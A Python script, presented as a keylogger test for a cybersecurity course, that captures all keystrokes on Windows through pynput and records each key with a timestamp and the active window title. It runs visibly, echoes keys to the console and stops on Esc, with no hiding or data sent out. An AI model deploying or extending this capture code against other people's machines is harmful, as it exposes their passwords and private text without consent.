#!/usr/bin/env python3
"""
Keylogger Test Utility for Cybersecurity Course
This script tests if keylogging functionality works on the current system.
"""

import os
import sys
import time
import threading
import ctypes
from datetime import datetime

# Try to import required packages
try:
    from pynput import keyboard
    import win32gui
except ImportError:
    print("Error: Required packages not found. Please install them with:")
    print("pip install pynput pywin32")
    sys.exit(1)

def is_admin():
    """Check if the script is running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

class KeyloggerTest:
    def __init__(self):
        self.keylog_buffer = []
        self.keylog_active = False
        self.keylog_listener = None
        self.last_window_title = ""
        self.lock = threading.Lock()
        
    def get_active_window(self):
        """Get the currently active window"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(hwnd)
            return title
        except Exception as e:
            print(f"Error getting active window: {str(e)}")
            return ""
            
    def on_key_press(self, key):
        """Handle keypress for keylogger"""
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                key_str = key.char
            else:
                key_str = str(key).replace("Key.", "")
                
            # Get active window
            window_title = self.get_active_window()
            
            # Append to buffer with timestamp and active window
            with self.lock:
                self.keylog_buffer.append({
                    'timestamp': datetime.now().isoformat(),
                    'key': key_str,
                    'window': window_title
                })
                
            # Also print to console for immediate feedback
            print(f"[{window_title}] Key pressed: {key_str}")
            
            # Exit if Esc is pressed
            if key == keyboard.Key.esc:
                print("\nEsc key pressed. Stopping keylogger...")
                return False
                
        except Exception as e:
            print(f"Error logging key press: {str(e)}")
            
        return True
            
    def start(self):
        """Start the keylogger test"""
        if self.keylog_active:
            print("Keylogger already active")
            return False
            
        try:
            print("Starting keylogger test...")
            self.keylog_active = True
            self.keylog_buffer = []
            
            # Start keylogger listener
            self.keylog_listener = keyboard.Listener(on_press=self.on_key_press)
            self.keylog_listener.start()
            
            print("\nKeylogger active! Type something to test (press Esc to stop)...\n")
            
            # Wait for listener to exit
            self.keylog_listener.join()
            
            # Print summary
            print("\nKeylogger test completed.")
            print(f"Captured {len(self.keylog_buffer)} keypresses.")
            
            if len(self.keylog_buffer) > 0:
                print("\nTest was SUCCESSFUL! Keylogging is working on your system.")
            else:
                print("\nTest FAILED! No keypresses were captured.")
                print("This may be due to permission issues or security software blocking the keylogger.")
            
            return True
        except Exception as e:
            print(f"Error starting keylogger: {str(e)}")
            import traceback
            traceback.print_exc()
            return False

def main():
    """Main function"""
    print("=" * 60)
    print("Keylogger Test Utility for Cybersecurity Course")
    print("=" * 60)
    
    # Print system info
    print(f"\nPython version: {sys.version}")
    print(f"Running as administrator: {'Yes' if is_admin() else 'No'}")
    
    if not is_admin():
        print("\nWARNING: Not running with administrator privileges.")
        print("Keylogging may not work properly without admin rights.")
        print("Consider running this script as administrator for best results.")
        
        # Ask user if they want to continue
        response = input("\nContinue anyway? (y/n): ")
        if response.lower() != 'y':
            print("Exiting. Please restart the script with administrator privileges.")
            sys.exit(0)
    
    # Run the keylogger test
    tester = KeyloggerTest()
    tester.start()
    
if __name__ == "__main__":
    main() 